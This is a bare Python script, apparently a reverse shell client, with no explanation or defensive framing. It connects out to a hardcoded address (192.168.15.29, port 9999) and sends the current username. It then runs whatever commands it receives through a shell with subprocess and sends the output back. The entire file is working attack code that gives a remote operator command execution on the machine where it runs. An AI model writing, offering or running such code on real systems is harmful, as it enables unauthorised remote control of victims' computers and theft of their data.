#!/usr/bin/env python3

import socket
import threading
import sys
import subprocess
import os

def main() :
    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    
    client.connect(("192.168.15.29",9999))
    
    process(client)
    
def process(client) :
    while True :
        client.send((os.getlogin()).encode())
        command = task(client)
        if not len(command) :
            break
        if command[:2] == "cd" :
            if command[:5] == "cd .." :
                path = os.getcwd()
                index = path.rfind('/')
                os.chdir(path[0:index])
            else :
                
                path = os.getcwd()
                os.chdir(path+'/'+command[3:len(command)-1])
            command = 'pwd'
        command = command.rstrip()
        try :
            output  = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=True)
        except :
            output = "Invalid option !".encode()
        
        client.send(output)
    client.close()

        
def task(client) :
    recv_len = 1
    bufferd = ""
    while True :
        data = (client.recv(4096)).decode()
        bufferd += data
        if len(data) < 4096 :
            break
        
    return bufferd
        
        

main()
